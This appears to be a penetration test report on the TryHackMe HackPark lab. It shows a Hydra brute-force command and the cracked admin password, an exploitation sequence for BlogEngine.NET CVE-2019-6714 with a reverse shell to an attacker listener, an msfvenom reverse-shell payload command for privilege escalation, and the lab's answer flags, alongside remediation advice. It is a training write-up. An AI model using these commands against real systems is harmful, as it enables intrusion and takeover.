# VAPT Report — HackPark

---

## Cover

| Field           | Detail                                             |
| --------------- | -------------------------------------------------- |
| Report Title    | Vulnerability Assessment & Penetration Test Report |
| Target          | HackPark (TryHackMe Lab)                           |
| Target IP       | 10.49.153.22                                       |
| Report Date     | 2026-03-08                                         |
| Assessor        | r3b3Lli0us_kID                                     |
| Classification  | Confidential — Lab Exercise                        |
| Engagement Type | Black Box Penetration Test                         |

---

## 1. Executive Summary

A penetration test was conducted against the HackPark server at `10.49.153.22`. The objective was to identify and exploit vulnerabilities as an unauthenticated external attacker.

**Result: Full system compromise achieved.**

Four vulnerabilities were identified — two Critical, one High, one Medium. The attack chain progressed from credential brute force → authenticated RCE → privilege escalation to SYSTEM in a fully automated chain, requiring no insider knowledge.

| Severity | Count |
|---|---|
| Critical | 2 |
| High | 1 |
| Medium | 1 |
| **Total** | **4** |

**Key risk:** The combination of weak credentials and an unpatched CVE (CVE-2019-6714) allowed unauthenticated remote code execution, leading to full SYSTEM access within a single engagement session.

---

## 2. Scope & Objectives

### Scope

| Target | IP | Service | Included |
|---|---|---|---|
| HackPark Server | 10.49.153.22 | HTTP (80), RDP (3389) | Yes |

**Out of scope:** All other systems, network infrastructure, external dependencies.

### Objectives
- Identify exposed attack surface via network enumeration
- Attempt authenticated and unauthenticated exploitation
- Escalate privileges to highest available level
- Document all findings with evidence and remediation guidance

---

## 3. Methodology

```
Reconnaissance → Enumeration → Exploitation → Post-Exploitation → Reporting
```

| Phase | Activities | Tools |
|---|---|---|
| Reconnaissance | Port scan, service fingerprinting, OS detection | nmap |
| Enumeration | Web directory scan, HTTP header analysis, login form analysis | nmap scripts, curl |
| Exploitation | Credential brute force, CVE-2019-6714 RCE | Hydra, custom Python exploit |
| Post-Exploitation | Privilege escalation enumeration, binary replacement | WinPEAS, msfvenom, nc |
| Reporting | Documentation of findings, CVSS scoring, remediation | Manual |

---

## 4. Findings Summary

| ID | Title | CVSS | Severity | Status |
|---|---|---|---|---|
| F01 | Weak Administrator Credentials | 9.8 | Critical | Open |
| F02 | CVE-2019-6714 — BlogEngine.NET RCE | 9.8 | Critical | Open |
| F03 | SystemScheduler Insecure Service Binary | 7.8 | High | Open |
| F04 | RDP Exposed to Internet (Port 3389) | 5.3 | Medium | Open |

---

## 5. Detailed Findings

---

### F01 — Weak Administrator Credentials

| Field | Detail |
|---|---|
| **Severity** | Critical |
| **CVSS Score** | 9.8 |
| **CVSS Vector** | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H` |
| **Affected Component** | BlogEngine.NET Admin Login — `/Account/login.aspx` |

**Description**

The BlogEngine.NET administrator account (`admin`) was protected by the weak password `1qaz2wsx` — a keyboard-walk pattern that appears in common wordlists such as `rockyou.txt`. The login form at `/Account/login.aspx` has no rate limiting, lockout policy, or CAPTCHA, allowing automated brute-force attacks.

**Evidence**

```bash
# Command
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.49.153.22 \
  http-post-form '/Account/login.aspx:<form-fields>:Login failed' -t 30

# Result
[80][http-post-form] host: 10.49.153.22   login: admin   password: 1qaz2wsx
1 of 1 target successfully completed, 1 valid password found
```

**Impact**

Administrative access to the CMS allows content manipulation, file uploads, and further exploitation of application features (as demonstrated in F02).

**Remediation**
- Immediately change the `admin` password to a strong, unique credential (20+ chars, mixed case, symbols)
- Enforce account lockout after 5 failed attempts
- Implement multi-factor authentication on the admin panel
- Consider restricting `/admin/` to trusted IP ranges

---

### F02 — CVE-2019-6714: BlogEngine.NET 3.3.6 Path Traversal → RCE

| Field | Detail |
|---|---|
| **Severity** | Critical |
| **CVSS Score** | 9.8 |
| **CVSS Vector** | `CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H` |
| **CVE** | CVE-2019-6714 |
| **Affected Component** | BlogEngine.NET 3.3.6 — File Manager API |

**Description**

BlogEngine.NET 3.3.6 contains a path traversal vulnerability in its file manager API (`/api/upload?action=filemgr`). An authenticated attacker can upload a malicious `.ascx` ASP.NET user control file named `PostView.ascx` into a date-based subdirectory of `App_Data/files/` (e.g. `App_Data/files/2026/03/`). The file is then executed by setting the `theme` cookie to the traversal path `../../App_Data/files/YYYY/MM/`, causing the server to load and compile the uploaded control, triggering the embedded reverse shell code.

> **Note:** The URL query parameter method (`?theme=`) does not reliably trigger execution. The `theme` cookie method is the confirmed working vector.

**Evidence**

```bash
# Step 1: Upload malicious PostView.ascx to date-based path
POST /api/upload?action=filemgr HTTP/1.1
[multipart: file=PostView.ascx (C# reverse shell payload)]
→ 201 Created: "/file.axd?file=%2f2026%2f03%2fPostView.ascx|PostView.ascx (2.1KB)"

# Step 2: Trigger execution via theme cookie
GET / HTTP/1.1
Cookie: theme=../../App_Data/files/2026/03/
→ [Request times out — reverse shell connects back to attacker]

# Listener result
nc -lvnp 4444
connect to [192.168.205.106] from (UNKNOWN) [10.49.153.22] 49347
Microsoft Windows [Version 6.3.9600]
C:\windows\system32\inetsrv> whoami
iis apppool\blog
```

**Impact**

Remote code execution as the IIS application pool identity (`iis apppool\blog`), providing a persistent foothold with filesystem access, ability to read web.config (credentials), and lateral movement capability.

**Remediation**
- **Immediately upgrade** BlogEngine.NET to the latest patched release
- Restrict file manager access to administrators only, and audit uploaded file types
- Implement a WAF rule blocking `.ascx`, `.aspx`, `.ashx` uploads
- Disable the `theme` query parameter or validate it strictly against an allowlist

---

### F03 — SystemScheduler Insecure Service Binary

| Field | Detail |
|---|---|
| **Severity** | High |
| **CVSS Score** | 7.8 |
| **CVSS Vector** | `CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H` |
| **Affected Component** | `C:\Program Files (x86)\SystemScheduler\Message.exe` |

**Description**

The SystemScheduler service runs `Message.exe` on a timed schedule with SYSTEM privileges. The binary file and its parent directory have insecure permissions, granting write access to standard (low-privileged) users. An attacker with a low-privilege shell can replace `Message.exe` with a malicious reverse shell payload, which is then executed automatically by the scheduler as `NT AUTHORITY\SYSTEM`.

**Evidence**

```cmd
# Discovered via WinPEAS
C:\Program Files (x86)\SystemScheduler\Message.exe
  Permissions: Everyone:(F) — Full Control

# Exploit chain
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<attacker> LPORT=4444 -f exe -o Message.exe
# Replace binary, wait for scheduler → SYSTEM shell
whoami
nt authority\system
```

**Impact**

Full SYSTEM-level compromise of the server. An attacker can read all files (including SAM/SYSTEM hives for credential extraction), install persistent backdoors, and pivot to other systems.

**Remediation**
- Fix ACLs on `C:\Program Files (x86)\SystemScheduler\` — restrict write access to Administrators and SYSTEM only
- Run the scheduler service under a dedicated low-privilege service account, not SYSTEM
- Enable Windows Defender application control to block unsigned binary replacement

---

### F04 — RDP Exposed to Internet

| Field | Detail |
|---|---|
| **Severity** | Medium |
| **CVSS Score** | 5.3 |
| **CVSS Vector** | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N` |
| **Affected Component** | Port 3389/tcp — Microsoft Terminal Services |

**Description**

The Remote Desktop Protocol (RDP) service is listening on port 3389 and is accessible from the public internet with no network-level restriction. This exposes the server to brute-force attacks, RDP vulnerabilities (e.g., BlueKeep/DejaBlue), and credential stuffing.

**Evidence**

```
PORT     STATE SERVICE       VERSION
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| rdp-ntlm-info:
|   Target_Name: HACKPARK
|   Product_Version: 6.3.9600
```

**Remediation**
- Block port 3389 at the firewall for all public IP addresses
- Require VPN or bastion host access for RDP
- Enable Network Level Authentication (NLA)
- Apply all Windows security patches (Server 2012 R2 is EOL — consider migration)

---

## 6. Attack Timeline

```
[Phase 1 — Recon]
nmap -Pn -sC -sV → Ports 80 (IIS 8.5 / BlogEngine.NET) and 3389 (RDP)

[Phase 2 — Exploitation]
Hydra brute force → admin:1qaz2wsx (F01)
CVE-2019-6714 → PostView.ascx uploaded → theme traversal triggers RCE
Reverse shell → iis apppool\blog (F02)

[Phase 3 — Privilege Escalation]
WinPEAS → SystemScheduler insecure binary (F03)
Message.exe replaced → SYSTEM shell (F03)

[Flags]
user.txt → 759bd8af507517bcfaede78a21a73e39
root.txt → 7e13d97f05f7ceb9881a3eb3d78d3e72
```

---

## 7. Conclusion

The HackPark server demonstrated a critically weak security posture. A completely unauthenticated external attacker can achieve full SYSTEM compromise in a short engagement window through a straightforward three-step chain: brute force credentials → exploit unpatched CVE → replace insecure service binary.

**Priority actions:**
1. Change all default/weak passwords immediately
2. Patch or replace BlogEngine.NET 3.3.6
3. Fix SystemScheduler binary permissions
4. Firewall-restrict RDP
5. Consider migrating from Windows Server 2012 R2 (EOL since October 2023)

---

## 8. Appendix

### A — Tools Used

| Tool | Version | Purpose |
|---|---|---|
| nmap | 7.98 | Port scanning, service detection |
| Hydra | 9.6 | HTTP form brute force |
| Python requests | 3.x | CVE-2019-6714 exploit automation |
| netcat | 1.10 | Reverse shell listener |
| msfvenom | — | Payload generation |
| WinPEAS | latest | Windows privilege escalation enumeration |
| Gemini 2.0 Flash | — | Research assistance (attack chain, report draft) |

### B — References

- CVE-2019-6714: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-6714
- BlogEngine.NET exploit: ExploitDB #46353
- WinPEAS: https://github.com/carlospolop/PEASS-ng
- TryHackMe HackPark Room: https://tryhackme.com/room/hackpark

### C — Vault Links

- [[Pentesting/Cheatsheets/Methodology]]
- [[Pentesting/Tools]]
- [[HomeLab/Kali-VM-Setup]]
- [[HomeLab/VPN-Setup]]
